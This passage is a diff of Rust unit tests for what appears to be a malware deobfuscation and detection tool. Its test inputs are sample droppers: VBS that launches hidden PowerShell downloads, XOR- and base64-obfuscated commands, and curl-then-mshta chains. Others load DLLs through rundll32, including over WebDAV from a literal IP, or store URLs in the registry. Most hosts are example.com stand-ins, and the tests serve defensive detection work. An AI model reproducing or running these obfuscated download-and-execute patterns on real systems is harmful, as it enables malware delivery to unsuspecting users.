+    #[test]
+    fn standalone_vbs_powershell_run_is_extracted_and_scanned_as_ps() {
+        let mut env = Environment::new(&Config::default());
+        let vbs = br#"Set sh = CreateObject("WScript.Shell")
+sh.Run "powershell -Command Invoke-WebRequest -Uri https://vbs-powershell-run.example/payload.ps1", 0, False"#;
+        env.all_extracted_vbs.push(vbs.to_vec());
+        crate::vbs_scan::scan_vbs_payloads(&mut env);
+        assert!(
+            env.all_extracted_ps1
+                .iter()
+                .any(|ps| String::from_utf8_lossy(ps)
+                    .contains("https://vbs-powershell-run.example/payload.ps1")),
+            "VBS PowerShell run was not extracted as PS: {:?}",
+            env.all_extracted_ps1
+        );
+        assert!(
+            env.traits.iter().any(|t| matches!(
+                t,
+                Trait::Download { src, .. }
+                    if src == "https://vbs-powershell-run.example/payload.ps1"
+            )),
+            "VBS PowerShell run was not scanned as PS: {:?}",
+            env.traits
+        );
+    }
+
+    #[test]
+    fn standalone_vbs_execute_xor_chr_loop_method_run_is_expanded() {
+        let mut env = Environment::new(&Config::default());
+        let vbs = br#"Dim method, values, i, cmd
+values = Array(154, 189, 166)
+method = ""
+For i = 0 To UBound(values)
+    method = method & Chr(values(i) Xor 200)
+Next
+cmd = "powershell -Command Invoke-WebRequest -Uri https://vbs-xor-method.example/payload.ps1"
+Set sh = CreateObject("WScript.Shell")
+Execute "sh." & method & " cmd, 0, False""#;
+        env.all_extracted_vbs.push(vbs.to_vec());
+        crate::vbs_scan::scan_vbs_payloads(&mut env);
+        assert!(
+            env.all_extracted_ps1
+                .iter()
+                .any(|ps| String::from_utf8_lossy(ps)
+                    .contains("https://vbs-xor-method.example/payload.ps1")),
+            "VBS Execute/XOR method Run did not extract PS: {:?}",
+            env.all_extracted_ps1
+        );
+    }
+
+    #[test]
+    fn standalone_vbs_execute_redim_xor_chr_loop_method_run_is_expanded() {
+        let mut env = Environment::new(&Config::default());
+        let vbs = br#"Dim method, values, i, cmd
+ReDim values(2)
+values(0) = 51
+values(1) = 20
+values(2) = 15
+method = ""
+For i = 0 To UBound(values)
+    method = method & Chr(values(i) Xor 97)
+Next
+cmd = "powershell -Command Invoke-WebRequest -Uri https://vbs-redim-xor-method.example/payload.ps1"
+Set sh = CreateObject("WScript.Shell")
+Execute "sh." & method & " cmd, 0, False""#;
+        env.all_extracted_vbs.push(vbs.to_vec());
+        crate::vbs_scan::scan_vbs_payloads(&mut env);
+        assert!(
+            env.all_extracted_ps1
+                .iter()
+                .any(|ps| String::from_utf8_lossy(ps)
+                    .contains("https://vbs-redim-xor-method.example/payload.ps1")),
+            "VBS Execute/ReDim XOR method Run did not extract PS: {:?}",
+            env.all_extracted_ps1
+        );
+    }
+
+    #[test]
+    fn standalone_vbs_nodetypedvalue_xor_command_is_recovered() {
+        let mut env = Environment::new(&Config::default());
+        let command = b"conhost.exe --headless powershell.exe -Command Invoke-WebRequest -Uri https://vbs-nodetypedvalue.example/payload.ps1";
+        let encoded = base64::Engine::encode(
+            &base64::engine::general_purpose::STANDARD,
+            command.iter().map(|byte| byte ^ 42).collect::<Vec<u8>>(),
+        );
+        let vbs = format!(
+            r#"Dim encoded, key, dtype, bytes, i, cmd
+encoded = "{encoded}"
+key = 42
+Dim dtype_values
+dtype_values = Array(72, 67, 68, 4, 72, 75, 89, 79, 28, 30)
+dtype = ""
+For i = 0 To UBound(dtype_values)
+    dtype = dtype & Chr(dtype_values(i) Xor 42)
+Next
+Set xml = CreateObject("MSXML2.DOMDocument.6.0")
+Set node = xml.CreateElement("tmp")
+node.DataType = dtype
+node.Text = encoded
+ReDim bytes(LenB(node.NodeTypedValue) - 1)
+For i = 0 To UBound(bytes)
+    bytes(i) = AscB(MidB(node.NodeTypedValue, i + 1, 1))
+Next
+For i = 0 To UBound(bytes)
+    bytes(i) = bytes(i) Xor key
+Next
+cmd = ""
+For i = 0 To UBound(bytes)
+    cmd = cmd & Chr(bytes(i))
+Next
+Set sh = CreateObject("WScript.Shell")
+sh.Run cmd, 0, False"#
+        );
+        env.all_extracted_vbs.push(vbs.into_bytes());
+        crate::vbs_scan::scan_vbs_payloads(&mut env);
+        assert!(
+            env.all_extracted_ps1
+                .iter()
+                .any(|ps| String::from_utf8_lossy(ps)
+                    .contains("https://vbs-nodetypedvalue.example/payload.ps1")),
+            "VBS NodeTypedValue/XOR command did not extract PS: {:?}",
+            env.all_extracted_ps1
+        );
+    }
+
+    #[test]
+    fn standalone_vbs_env_scriptblock_payload_is_recovered() {
+        let mut env = Environment::new(&Config::default());
+        let url = "https://vbs-env-scriptblock.example/payload.ps1";
+        let ps = "Invoke-WebRequest -Uri $env:STAGE_URL";
+        let nums = ps
+            .bytes()
+            .map(|byte| byte.to_string())
+            .collect::<Vec<_>>()
+            .join(", ");
+        let vbs = format!(
+            r#"Dim sh, proc_env, payload, values, pair, i
+values = Array({nums})
+pair = Array("STAGE_URL", "{url}")
+payload = ""
+For i = 0 To UBound(values)
+    payload = payload & Chr(values(i))
+Next
+Set sh = CreateObject("WScript.Shell")
+Set proc_env = sh.Environment("Process")
+proc_env(pair(0)) = pair(1)
+proc_env("PAYLOAD") = payload
+sh.Run "powershell -Command ""&([scriptblock]::Create($env:PAYLOAD))""", 0, False"#
+        );
+        env.all_extracted_vbs.push(vbs.into_bytes());
+        crate::vbs_scan::scan_vbs_payloads(&mut env);
+        assert!(
+            env.all_extracted_ps1
+                .iter()
+                .any(|payload| String::from_utf8_lossy(payload)
+                    .contains("https://vbs-env-scriptblock.example/payload.ps1")),
+            "VBS env-backed scriptblock payload was not extracted: {:?}",
+            env.all_extracted_ps1
+        );
+        crate::ps1_scan::scan_ps1_payloads(&mut env);
+        assert!(
+            env.traits.iter().any(|t| matches!(
+                t,
+                Trait::Download { src, .. }
+                    if src == "https://vbs-env-scriptblock.example/payload.ps1"
+            )),
+            "VBS env-backed scriptblock payload was not scanned as PS: {:?}",
+            env.traits
+        );
+    }
+
+    #[test]
+    fn analyze_vbs_env_scriptblock_payload_is_scanned_as_ps() {
+        let url = "https://vbs-env-analyze.example/payload.ps1";
+        let ps = "Invoke-WebRequest -Uri $env:STAGE_URL";
+        let nums = ps
+            .bytes()
+            .map(|byte| byte.to_string())
+            .collect::<Vec<_>>()
+            .join(", ");
+        let vbs = format!(
+            r#"Dim sh, proc_env, payload, values, pair, i
+values = Array({nums})
+pair = Array("STAGE_URL", "{url}")
+payload = ""
+For i = 0 To UBound(values)
+    payload = payload & Chr(values(i))
+Next
+Set sh = CreateObject("WScript.Shell")
+Set proc_env = sh.Environment("Process")
+proc_env(pair(0)) = pair(1)
+proc_env("PAYLOAD") = payload
+sh.Run "powershell -Command ""&([scriptblock]::Create($env:PAYLOAD))""", 0, False"#
+        );
+
+        let report = analyze(vbs.as_bytes(), &Config::default());
+
+        assert!(
+            report.extracted_ps1.iter().any(|payload| {
+                String::from_utf8_lossy(payload)
+                    .contains("https://vbs-env-analyze.example/payload.ps1")
+            }),
+            "VBS env-backed scriptblock payload was not extracted: {:?}",
+            report.extracted_ps1
+        );
+        assert!(
+            report.traits.iter().any(|t| matches!(
+                t,
+                Trait::Download { src, .. }
+                    if src == "https://vbs-env-analyze.example/payload.ps1"
+            )),
+            "VBS env-backed scriptblock payload was not scanned as PS: {:?}",
+            report.traits
+        );
+    }
+
+    #[test]
+    fn standalone_vbs_execute_prefix_xmlhttp_url_extracted() {
+        let vbs = br#"Execute "Set http = CreateObject(""MSXML2.XMLHTTP""): http.Open ""GET"", ""https://standalone-vbs-execute.example/payload.txt"", False: http.Send""#;
+        let report = analyze(vbs, &Config::default());
+        let has = report.traits.iter().any(|t| {
+            matches!(t,
+                Trait::Download { src, .. }
+                    if src == "https://standalone-vbs-execute.example/payload.txt"
+            )
+        });
+        assert!(
+            has,
+            "no Download trait from standalone VBS with Execute prefix: {:?}",
+            report.traits
+        );
+        assert!(
+            report
+                .deobfuscated
+                .contains("Execute \"Set http = CreateObject"),
+            "standalone VBS source was not preserved in deobfuscated output: {:?}",
+            report.deobfuscated
+        );
+    }
+
+    #[test]
+    fn standalone_vbs_executeglobal_paren_prefix_xmlhttp_url_extracted() {
+        let vbs = br#"ExecuteGlobal("Set http = CreateObject(""MSXML2.XMLHTTP""): http.Open ""GET"", ""https://standalone-vbs-executeglobal.example/payload.txt"", False: http.Send")"#;
+        let report = analyze(vbs, &Config::default());
+        let has = report.traits.iter().any(|t| {
+            matches!(t,
+                Trait::Download { src, .. }
+                    if src == "https://standalone-vbs-executeglobal.example/payload.txt"
+            )
+        });
+        assert!(
+            has,
+            "no Download trait from standalone VBS with ExecuteGlobal paren prefix: {:?}",
+            report.traits
+        );
+        assert!(
+            report
+                .deobfuscated
+                .contains("ExecuteGlobal(\"Set http = CreateObject"),
+            "standalone VBS source was not preserved in deobfuscated output: {:?}",
+            report.deobfuscated
+        );
+    }
+
+    #[test]
+    fn standalone_vbs_assignment_globalexecute_payload_is_scanned() {
+        let vbs = br#"payload = "Set http = CreateObject(""MSXML2.XMLHTTP""): http.Open ""GET"", ""https://standalone-vbs-globalexecute-var.example/payload.txt"", False: http.Send"
+GlobalExecute payload"#;
+        let report = analyze(vbs, &Config::default());
+        let has = report.traits.iter().any(|t| {
+            matches!(t,
+                Trait::Download { src, .. }
+                    if src == "https://standalone-vbs-globalexecute-var.example/payload.txt"
+            )
+        });
+        assert!(
+            has,
+            "no Download trait from standalone VBS GlobalExecute variable payload: {:?}",
+            report.traits
+        );
+        assert_eq!(
+            report.extracted_vbs.len(),
+            1,
+            "assignment-first GlobalExecute VBS was not queued as VBS"
+        );
+    }
+
+    #[test]
     fn utf16le_vbs_blob_is_decoded_and_scanned() {
         let vbs = r#"Set http = CreateObject("MSXML2.XMLHTTP")
 http.Open "GET", "http://utf16.example/payload.vbs", False
@@ -8935,6 +22033,35 @@ http.Send"#;
             report.traits
         );
     }
+
+    #[test]
+    fn utf16le_bom_vbs_with_non_ascii_prefix_is_decoded_and_scanned() {
+        let non_ascii_prefix = "数据导出功能已完成".repeat(256);
+        let vbs = format!(
+            r#"' {non_ascii_prefix}
+Set http = CreateObject("MSXML2.XMLHTTP")
+http.Open "GET", "http://utf16-bom-cjk.example/payload.vbs", False
+http.Send"#
+        );
+        let mut utf16 = vec![0xff, 0xfe];
+        utf16.extend(vbs.encode_utf16().flat_map(|u| u.to_le_bytes()));
+        let report = analyze(&utf16, &AnalyzeConfig::default());
+        assert!(
+            report.deobfuscated.contains("CreateObject") && !report.deobfuscated.contains('\0'),
+            "UTF-16LE BOM VBS was not rendered as readable text: {:?}",
+            report.deobfuscated
+        );
+        let has = report.traits.iter().any(|t| {
+            matches!(t,
+                Trait::Download { src, .. } if src.contains("utf16-bom-cjk.example/payload.vbs")
+            )
+        });
+        assert!(
+            has,
+            "UTF-16LE BOM VBS download was not extracted: {:?}",
+            report.traits
+        );
+    }
 }
 
 #[cfg(test)]
@@ -8942,6 +22069,7 @@ http.Send"#;
 mod copy_multi_source_tests {
     use crate::env::{Config, Environment, FsEntry};
     use crate::interp::interpret_line;
+    use crate::traits::Trait;
 
     #[test]
     fn copy_b_multi_source_concat_tracked() {
@@ -8981,6 +22109,147 @@ mod copy_multi_source_tests {
             }
             _ => panic!("unexpected entry: {:?}", entry),
         }
+    }
+
+    #[test]
+    fn copy_preserves_download_source_for_later_execution() {
+        let report = crate::analyze(
+            br#"curl -o original.hta https://copy-download.example/payload.hta
+copy original.hta renamed.hta
+mshta renamed.hta"#,
+            &Config::default(),
+        );
+        assert!(
+            report.traits.iter().any(|t| {
+                matches!(
+                    t,
+                    Trait::UrlArgument { cmd, url }
+                        if cmd == "mshta renamed.hta"
+                            && url == "https://copy-download.example/payload.hta"
+                )
+            }),
+            "copied downloaded HTA was not linked on later execution: {:?}",
+            report.traits
+        );
+    }
+
+    #[test]
+    fn copy_basename_source_preserves_full_path_download_for_later_execution() {
+        let report = crate::analyze(
+            br#"curl -o C:\Temp\original.hta https://copy-basename-download.example/payload.hta
+copy ORIGINAL.HTA renamed.hta
+mshta renamed.hta"#,
+            &Config::default(),
+        );
+        assert!(
+            report.traits.iter().any(|t| {
+                matches!(
+                    t,
+                    Trait::UrlArgument { cmd, url }
+                        if cmd == "mshta renamed.hta"
+                            && url == "https://copy-basename-download.example/payload.hta"
+                )
+            }),
+            "basename copied downloaded HTA was not linked on later execution: {:?}",
+            report.traits
+        );
+    }
+
+    #[test]
+    fn single_source_file_ops_preserve_tracked_content() {
+        for command in [
+            "copy original.vbs renamed.vbs",
+            "xcopy /y original.vbs renamed.vbs",
+            "move /y original.vbs renamed.vbs",
+            "ren original.vbs renamed.vbs",
+        ] {
+            let mut env = Environment::new(&Config::default());
+            env.modified_filesystem.insert(
+                "original.vbs".to_string(),
+                FsEntry::Content {
+                    content: b"CreateObject(\"WScript.Shell\").Run \"mshta https://content-copy.example/payload.hta\"".to_vec(),
+                    append: false,
+                },
+            );
+            interpret_line(command, &mut env);
+            let entry = env
+                .modified_filesystem
+                .get("renamed.vbs")
+                .unwrap_or_else(|| panic!("renamed.vbs missing after {command}"));
+            assert!(
+                matches!(entry, FsEntry::Content { content, .. }
+                    if content.windows(b"content-copy.example".len())
+                        .any(|window| window == b"content-copy.example")),
+                "tracked content was not preserved after {command}: {:?}",
+                entry
+            );
+        }
+    }
+
+    #[test]
+    fn xcopy_preserves_download_source_for_later_execution() {
+        let report = crate::analyze(
+            br#"curl -o original.hta https://xcopy-download.example/payload.hta
+xcopy /y original.hta renamed.hta
+mshta renamed.hta"#,
+            &Config::default(),
+        );
+        assert!(
+            report.traits.iter().any(|t| {
+                matches!(
+                    t,
+                    Trait::UrlArgument { cmd, url }
+                        if cmd == "mshta renamed.hta"
+                            && url == "https://xcopy-download.example/payload.hta"
+                )
+            }),
+            "xcopied downloaded HTA was not linked on later execution: {:?}",
+            report.traits
+        );
+    }
+
+    #[test]
+    fn move_preserves_download_source_for_later_execution() {
+        let report = crate::analyze(
+            br#"curl -o original.hta https://move-download.example/payload.hta
+move /y original.hta renamed.hta
+mshta renamed.hta"#,
+            &Config::default(),
+        );
+        assert!(
+            report.traits.iter().any(|t| {
+                matches!(
+                    t,
+                    Trait::UrlArgument { cmd, url }
+                        if cmd == "mshta renamed.hta"
+                            && url == "https://move-download.example/payload.hta"
+                )
+            }),
+            "moved downloaded HTA was not linked on later execution: {:?}",
+            report.traits
+        );
+    }
+
+    #[test]
+    fn ren_preserves_download_source_for_later_execution() {
+        let report = crate::analyze(
+            br#"curl -o original.hta https://ren-download.example/payload.hta
+ren original.hta renamed.hta
+mshta renamed.hta"#,
+            &Config::default(),
+        );
+        assert!(
+            report.traits.iter().any(|t| {
+                matches!(
+                    t,
+                    Trait::UrlArgument { cmd, url }
+                        if cmd == "mshta renamed.hta"
+                            && url == "https://ren-download.example/payload.hta"
+                )
+            }),
+            "renamed downloaded HTA was not linked on later execution: {:?}",
+            report.traits
+        );
     }
 }
 
@@ -9082,6 +22351,29 @@ mod deob_url_scan_tests {
     }
 
     #[test]
+    fn mshta_downloaded_hta_in_deob_text_resolves_url() {
+        let mut env = crate::env::Environment::new(&Config::default());
+        env.traits.push(Trait::Download {
+            cmd: "curl -o payload.hta https://mshta-deob-local.example/payload.hta".to_string(),
+            src: "https://mshta-deob-local.example/payload.hta".to_string(),
+            dst: Some("payload.hta".to_string()),
+        });
+        crate::deob_scan::scan_deob_text("mshta payload.hta", &mut env);
+        assert!(
+            env.traits.iter().any(|t| {
+                matches!(
+                    t,
+                    Trait::UrlArgument { cmd, url }
+                        if cmd == "mshta payload.hta"
+                            && url == "https://mshta-deob-local.example/payload.hta"
+                )
+            }),
+            "mshta downloaded HTA in deob text was not typed: {:?}",
+            env.traits
+        );
+    }
+
+    #[test]
     fn explicit_url_launch_emits_url_launch_without_generic_duplicate() {
         let mut env = crate::env::Environment::new(&Config::default());
         crate::deob_scan::scan_deob_text(
@@ -9126,12 +22418,310 @@ start msedge /max https://edge.example/lure.pdf"#,
     }
 
     #[test]
+    fn known_url_launchers_accept_schemeless_domain_path_arguments() {
+        let mut env = crate::env::Environment::new(&Config::default());
+        crate::deob_scan::scan_deob_text(
+            r#"msedge lure-schemeless.example/a.pdf
+explorer.exe portal-schemeless.example/privacy/
+start "" start-schemeless.example/lure.pdf"#,
+            &mut env,
+        );
+        for expected in [
+            "http://lure-schemeless.example/a.pdf",
+            "http://portal-schemeless.example/privacy/",
+            "http://start-schemeless.example/lure.pdf",
+        ] {
+            assert!(
+                env.traits
+                    .iter()
+                    .any(|t| matches!(t, Trait::UrlLaunch { url, .. } if url == expected)),
+                "missing schemeless UrlLaunch for {expected}: {:?}",
+                env.traits
+            );
+            assert!(
+                !env.traits
+                    .iter()
+                    .any(|t| matches!(t, Trait::DownloadInDeobText { src, .. } if src == expected)),
+                "schemeless URL launch double-emitted as generic: {:?}",
+                env.traits
+            );
+        }
+    }
+
+    #[test]
+    fn rundll32_fileprotocolhandler_url_emits_url_launch() {
+        let mut env = crate::env::Environment::new(&Config::default());
+        crate::deob_scan::scan_deob_text(
+            r#"rundll32.exe url.dll,FileProtocolHandler "https://rundll32-launch.example/lure.pdf"
+rundll32 url.dll,FileProtocolHandler https://rundll32-launch.example/extensionless.pdf"#,
+            &mut env,
+        );
+        for expected in [
+            "https://rundll32-launch.example/lure.pdf",
+            "https://rundll32-launch.example/extensionless.pdf",
+        ] {
+            let has = env.traits.iter().any(|t| {
+                matches!(t,
+                    Trait::UrlLaunch { url, .. } if url == expected
+                )
+            });
+            assert!(
+                has,
+                "rundll32 FileProtocolHandler URL launch missed for {expected}: {:?}",
+                env.traits
+            );
+            assert!(
+                !env.traits.iter().any(|t| {
+                    matches!(t,
+                        Trait::DownloadInDeobText { src, .. } | Trait::UrlArgument { url: src, .. }
+                            if src == expected
+                    )
+                }),
+                "rundll32 FileProtocolHandler URL double-emitted with weaker type: {:?}",
+                env.traits
+            );
+        }
+    }
+
+    #[test]
+    fn rundll32_url_exports_in_deob_text_emit_typed_traits() {
+        let mut env = crate::env::Environment::new(&Config::default());
+        crate::deob_scan::scan_deob_text(
+            r#"rundll32.exe shimgvw.dll,ImageView_Fullscreen "https://rundll32-image-deob.example/pic.jpg"
+rundll32.exe scrobj.dll,GenerateTypeLib https://rundll32-scrobj-deob.example/payload.exe"#,
+            &mut env,
+        );
+        assert!(
+            env.traits.iter().any(|t| {
+                matches!(
+                    t,
+                    Trait::UrlLaunch { url, .. }
+                        if url == "https://rundll32-image-deob.example/pic.jpg"
+                )
+            }),
+            "missing rundll32 image UrlLaunch in deob text: {:?}",
+            env.traits
+        );
+        assert!(
+            env.traits.iter().any(|t| {
+                matches!(
+                    t,
+                    Trait::Download { src, dst: None, .. }
+                        if src == "https://rundll32-scrobj-deob.example/payload.exe"
+                )
+            }),
+            "missing rundll32 scrobj Download in deob text: {:?}",
+            env.traits
+        );
+        for generic in [
+            "https://rundll32-image-deob.example/pic.jpg",
+            "https://rundll32-scrobj-deob.example/payload.exe",
+        ] {
+            assert!(
+                !env.traits
+                    .iter()
+                    .any(|t| matches!(t, Trait::DownloadInDeobText { src, .. } if src == generic)),
+                "rundll32 typed URL double-emitted as generic: {:?}",
+                env.traits
+            );
+        }
+    }
+
+    #[test]
+    fn rundll32_scrobj_downloaded_target_in_deob_text_resolves_url() {
+        let mut env = crate::env::Environment::new(&Config::default());
+        env.traits.push(Trait::Download {
+            cmd: "curl -o payload.sct https://rundll32-scrobj-deob-local.example/payload.sct"
+                .to_string(),
+            src: "https://rundll32-scrobj-deob-local.example/payload.sct".to_string(),
+            dst: Some("payload.sct".to_string()),
+        });
+        crate::deob_scan::scan_deob_text(
+            "rundll32.exe scrobj.dll,GenerateTypeLib payload.sct",
+            &mut env,
+        );
+        assert!(
+            env.traits.iter().any(|t| {
+                matches!(
+                    t,
+                    Trait::UrlArgument { cmd, url }
+                        if cmd == "rundll32.exe scrobj.dll,GenerateTypeLib payload.sct"
+                            && url == "https://rundll32-scrobj-deob-local.example/payload.sct"
+                )
+            }),
+            "rundll32 scrobj downloaded target in deob text was not typed: {:?}",
+            env.traits
+        );
+    }
+
+    #[test]
+    fn glued_rundll32_downloaded_dll_in_deob_text_resolves_url() {
+        let mut env = crate::env::Environment::new(&Config::default());
+        env.traits.push(Trait::Download {
+            cmd: "curl --output welnar.nvn https://glued-rundll32.example/stage".to_string(),
+            src: "https://glued-rundll32.example/stage".to_string(),
+            dst: Some("welnar.nvn".to_string()),
+        });
+        crate::deob_scan::scan_deob_text("rundll32welnar.nvn,init", &mut env);
+        assert!(
+            env.traits.iter().any(|t| {
+                matches!(
+                    t,
+                    Trait::Rundll32 { cmd, url: Some(url) }
+                        if cmd == "rundll32welnar.nvn,init"
+                            && url == "https://glued-rundll32.example/stage"
+                )
+            }),
+            "glued rundll32 downloaded DLL was not typed: {:?}",
+            env.traits
+        );
+    }
+
+    #[test]
+    fn spaced_rundll32_downloaded_dll_in_deob_text_resolves_url() {
+        let mut env = crate::env::Environment::new(&Config::default());
+        env.traits.push(Trait::Download {
+            cmd: "Invoke-WebRequest -OutFile C:\\programdata\\putty.jpg".to_string(),
+            src: "https://spaced-rundll32.example/putty.jpg".to_string(),
+            dst: Some("C:\\programdata\\putty.jpg".to_string()),
+        });
+        crate::deob_scan::scan_deob_text("rundll32 C:\\programdata\\putty.jpg,Wind", &mut env);
+        assert!(
+            env.traits.iter().any(|t| {
+                matches!(
+                    t,
+                    Trait::Rundll32 { cmd, url: Some(url) }
+                        if cmd == "rundll32 C:\\programdata\\putty.jpg,Wind"
+                            && url == "https://spaced-rundll32.example/putty.jpg"
+                )
+            }),
+            "spaced rundll32 downloaded DLL was not typed: {:?}",
+            env.traits
+        );
+    }
+
+    #[test]
+    fn rundll32_webdav_dll_in_deob_text_resolves_http_url() {
+        let report = crate::analyze(
+            br#"start powershell.exe -windowstyle hidden net use \\45.9.74.32@8888\davwwwroot\  rundll32 \\45.9.74.32@8888\davwwwroot\596.dll,entry"#,
+            &Config::default(),
+        );
+        assert!(
+            report.traits.iter().any(|t| {
+                matches!(
+                    t,
+                    Trait::Rundll32 { cmd, url: Some(url) }
+                        if cmd.contains(r#"rundll32 \\45.9.74.32@8888\davwwwroot\596.dll,entry"#)
+                            && url == "http://45.9.74.32:8888/596.dll"
+                )
+            }),
+            "rundll32 WebDAV DLL in deob text was not typed: {:?}",
+            report.traits
+        );
+    }
+
+    #[test]
+    fn glued_rundll32_scanner_ignores_non_execution_mentions() {
+        let mut env = crate::env::Environment::new(&Config::default());
+        crate::deob_scan::scan_deob_text(
+            r#"set valinf="rundll32_31152_toolbar"
+reg add HKCU\Software\Classes\CLSID\{x}\InProcServer32 /ve /d "rundll32.exe" /f
+taskkill /im rundll32.exe /f
+rundll32 C:\programdata\putty.jpg,Wind"#,
+            &mut env,
+        );
+        assert!(
+            !env.traits
+                .iter()
+                .any(|t| matches!(t, Trait::Rundll32 { .. })),
+            "non-execution rundll32 mentions were typed: {:?}",
+            env.traits
+        );
+    }
+
+    #[test]
+    fn html_help_url_emits_url_launch() {
+        let mut env = crate::env::Environment::new(&Config::default());
+        crate::deob_scan::scan_deob_text(
+            r#"hh.exe https://hh-launch.example/help.chm
+hh https://hh-launch.example/extensionless.chm"#,
+            &mut env,
+        );
+        for expected in [
+            "https://hh-launch.example/help.chm",
+            "https://hh-launch.example/extensionless.chm",
+        ] {
+            assert!(
+                env.traits
+                    .iter()
+                    .any(|t| matches!(t, Trait::UrlLaunch { url, .. } if url == expected)),
+                "missing HTML Help UrlLaunch for {expected}: {:?}",
+                env.traits
+            );
+            assert!(
+                !env.traits.iter().any(|t| {
+                    matches!(t,
+                        Trait::DownloadInDeobText { src, .. } | Trait::UrlArgument { url: src, .. }
+                            if src == expected
+                    )
+                }),
+                "HTML Help URL double-emitted with weaker type: {:?}",
+                env.traits
+            );
+        }
+    }
+
+    #[test]
+    fn powershell_url_launch_cmdlets_emit_url_launch() {
+        let mut env = crate::env::Environment::new(&Config::default());
+        crate::deob_scan::scan_deob_text(
+            r#"powershell -Command "Start-Process 'https://pslaunch.example/a.pdf'"
+powershell -Command "saps -FilePath https://pslaunch.example/b.pdf"
+powershell -Command "Invoke-Item https://pslaunch.example/c.pdf"
+powershell -Command "saps -WindowStyle Hidden -FilePath pslaunch-schemeless.example/d.pdf"
+powershell -Command "Start-Process -FilePath:pslaunch-attached.example/e.pdf"
+powershell -Command "Invoke-Item -Path=pslaunch-equals.example/f.pdf"
+powershell -Command "Start-Process -F:pslaunch-short.example/g.pdf"
+powershell -Command "ii -L:pslaunch-literal.example/h.pdf""#,
+            &mut env,
+        );
+        for expected in [
+            "https://pslaunch.example/a.pdf",
+            "https://pslaunch.example/b.pdf",
+            "https://pslaunch.example/c.pdf",
+            "http://pslaunch-schemeless.example/d.pdf",
+            "http://pslaunch-attached.example/e.pdf",
+            "http://pslaunch-equals.example/f.pdf",
+            "http://pslaunch-short.example/g.pdf",
+            "http://pslaunch-literal.example/h.pdf",
+        ] {
+            assert!(
+                env.traits
+                    .iter()
+                    .any(|t| matches!(t, Trait::UrlLaunch { url, .. } if url == expected)),
+                "missing PowerShell UrlLaunch for {expected}: {:?}",
+                env.traits
+            );
+            assert!(
+                !env.traits
+                    .iter()
+                    .any(|t| matches!(t, Trait::DownloadInDeobText { src, .. } if src == expected)),
+                "PowerShell URL launch double-emitted as generic: {:?}",
+                env.traits
+            );
+        }
+    }
+
+    #[test]
     fn url_variable_assignments_emit_typed_trait_without_generic_duplicate() {
         let mut env = crate::env::Environment::new(&Config::default());
         crate::deob_scan::scan_deob_text(
             r#"set "zipUrl=https://vars.example/payload.zip"
 @@if 1 EQU 1 set NN=https://raw.example/config.txt
-$urlzip = "https://ps.example/stage.zip""#,
+set "downloadUrl=vars-schemeless.example/payload.zip"
+set "mixedScheme=HtTpS://vars.example/mixed.bin"
+$urlzip = "https://ps.example/stage.zip"
+$stageUrl = "ps-schemeless.example/stage.zip""#,
             &mut env,
         );
         let vars: Vec<(String, String)> = env
@@ -9152,7 +22742,10 @@ $urlzip = "https://ps.example/stage.zip""#,
         for (name, expected) in [
             ("zipUrl", "https://vars.example/payload.zip"),
             ("NN", "https://raw.example/config.txt"),
+            ("downloadUrl", "http://vars-schemeless.example/payload.zip"),
+            ("mixedScheme", "https://vars.example/mixed.bin"),
             ("urlzip", "https://ps.example/stage.zip"),
+            ("stageUrl", "http://ps-schemeless.example/stage.zip"),
         ] {
             assert!(
                 vars.iter()
@@ -9168,6 +22761,20 @@ $urlzip = "https://ps.example/stage.zip""#,
                 env.traits
             );
         }
+    }
+
+    #[test]
+    fn resolved_deob_var_fragment_gate_requires_url_substring_shape() {
+        assert!(!crate::deob_scan::has_resolved_deob_var_fragment_shape(""));
+        assert!(!crate::deob_scan::has_resolved_deob_var_fragment_shape(
+            "echo https://plain.example/payload"
+        ));
+        assert!(!crate::deob_scan::has_resolved_deob_var_fragment_shape(
+            "echo %A:~0,1%%B:~0,1%"
+        ));
+        assert!(crate::deob_scan::has_resolved_deob_var_fragment_shape(
+            r#"echo "%A:~0,4%://%H:~0,11%/stage""#
+        ));
     }
 
     #[test]
@@ -9197,6 +22804,58 @@ $urlzip = "https://ps.example/stage.zip""#,
     }
 
     #[test]
+    fn registry_default_url_value_emits_typed_trait() {
+        let mut env = crate::env::Environment::new(&Config::default());
+        let url = "https://registry-default.example/payload";
+        crate::deob_scan::scan_deob_text(
+            &format!(r#"reg add "HKCU\Software\Classes\test" /ve /d "{url}" /f"#),
+            &mut env,
+        );
+        let has = env.traits.iter().any(|t| {
+            let Ok(value) = serde_json::to_value(t) else {
+                return false;
+            };
+            value.get("kind").and_then(|kind| kind.as_str()) == Some("RegistryUrl")
+                && value.get("value").and_then(|value| value.as_str()) == Some("(Default)")
+                && value.get("url").and_then(|got_url| got_url.as_str()) == Some(url)
+        });
+        assert!(has, "default Registry URL not typed: {:?}", env.traits);
+        assert!(
+            !env.traits
+                .iter()
+                .any(|t| matches!(t, Trait::DownloadInDeobText { src, .. } if src == url)),
+            "default Registry URL double-emitted as generic: {:?}",
+            env.traits
+        );
+    }
+
+    #[test]
+    fn registry_schemeless_url_value_emits_typed_trait() {
+        let mut env = crate::env::Environment::new(&Config::default());
+        let expected = "http://registry-schemeless.example/payload";
+        crate::deob_scan::scan_deob_text(
+            r#"reg add "HKCU\Software\App" /v UpdateUrl /d "registry-schemeless.example/payload" /f"#,
+            &mut env,
+        );
+        let has = env.traits.iter().any(|t| {
+            let Ok(value) = serde_json::to_value(t) else {
+                return false;
+            };
+            value.get("kind").and_then(|kind| kind.as_str()) == Some("RegistryUrl")
+                && value.get("value").and_then(|value| value.as_str()) == Some("UpdateUrl")
+                && value.get("url").and_then(|got_url| got_url.as_str()) == Some(expected)
+        });
+        assert!(has, "schemeless Registry URL not typed: {:?}", env.traits);
+        assert!(
+            !env.traits
+                .iter()
+                .any(|t| matches!(t, Trait::DownloadInDeobText { src, .. } if src == expected)),
+            "schemeless Registry URL double-emitted as generic: {:?}",
+            env.traits
+        );
+    }
+
+    #[test]
     fn process_url_argument_emits_typed_trait_without_generic_duplicate() {
         let mut env = crate::env::Environment::new(&Config::default());
         let url = "https://skynetx.com.br/html.html";
@@ -9217,6 +22876,386 @@ $urlzip = "https://ps.example/stage.zip""#,
                 .iter()
                 .any(|t| matches!(t, Trait::DownloadInDeobText { src, .. } if src == url)),
             "process URL argument double-emitted as generic: {:?}",
+            env.traits
+        );
+        assert!(
+            !env.traits
+                .iter()
+                .any(|t| matches!(t, Trait::Lolbas { name, .. } if name == "regsvr32")),
+            "generic process URL argument mislabeled as regsvr32 LOLBAS: {:?}",
+            env.traits
+        );
+    }
+
+    #[test]
+    fn regsvr32_scriptlet_url_argument_emits_typed_trait() {
